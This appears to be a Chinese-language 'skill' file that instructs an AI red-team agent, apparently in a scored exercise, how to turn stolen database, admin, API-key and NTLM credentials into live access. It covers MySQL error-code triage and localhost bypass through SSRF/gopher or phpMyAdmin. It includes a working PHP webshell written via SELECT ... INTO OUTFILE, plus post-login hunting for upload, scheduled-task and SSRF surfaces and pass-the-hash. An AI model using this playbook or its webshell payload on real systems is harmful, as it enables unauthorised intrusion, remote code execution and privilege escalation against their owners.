---
name: credential-to-access
description: 凭据到手之后：可用性判定（localhost 限定/哈希/过期）、转发与中继路径、从凭据到会话的最后一步
whenToUse: 拿到数据库口令、后台账号、API key、NTLM 哈希，但连不上或登不进；或漏洞 gained 写了"凭据"却没有权限分
role: exploit
enabled: true
---

# 凭据 → 权限：最后一步

## 第一步：判定这条凭据到底能不能用

~~~
DB 口令：直接握手，看返回码
  1045 = 用户/口令错
  1698 = 用户存在但只允许 @localhost  ← 最常见，凭据真实但不可远程
  1130 = 主机不允许连接
  MySQL 8 还要看 caching_sha2_password 是否要求 TLS
后台账号：先找登录接口，别在首页表单试（经常是不同认证栈）
API key：找用它签名的那个端点，不要盲试所有接口
哈希：NTLM 可 pass-the-hash；bcrypt 只能爆破
~~~

## localhost 限定的四条出路

~~~
1. SSRF / gopher 转发：目标自己连自己的 3306（需要目标有 SSRF 且协议可穿）
   注意：MySQL 协议不是纯文本，gopher 手工拼极难，优先考虑下面三条
2. 目标上有 Web 入口能执行 SQL：phpMyAdmin、adminer、Koha/Koha installer、Drupal 的 DB 配置页
   → 用这套凭据登录该入口 = 实际拿到 DB 管理面（通常算 web-app 或 db-credential）
3. SQL 写文件：有 FILE 权限且 secure_file_priv 允许 → SELECT ... INTO OUTFILE 写 webshell
   查：SELECT @@secure_file_priv, @@version_compile_os;
   写：SELECT '<?php system($_GET[1]);?>' INTO OUTFILE '/var/www/html/x.php'
4. 借应用层写入：Koha/Drupal 的安装器能改 DB 配置 → 指向自建 MySQL → 拿不到目标权限，只做数据迁移，别当突破口
~~~

## 后台账号到手后

~~~
1. 登录 → 找"上传"类功能（插件/主题/模板/备份导入）→ 那才是 RCE 面
2. 找"计划任务/定时"→ 命令执行面
3. 找"数据源/外部连接"→ SSRF 面
4. 找"用户管理"→ 提权到 admin（如果当前是普通账号）
普通账号也算分（web-app 50），别因为不是 admin 就不记
~~~

## 判据与落库

- 能登录/能连库 = 权限到手，记 score_hit；只是"知道口令"不算
- 落 `redteam_credential_add` 时写清 usable（远程/localhost-only/失效）与验证命令
- 1698 这类记 `redteam_vuln_add` 的 evidence，别当成功；在报告里写成"凭据可得但受限，路径为 X"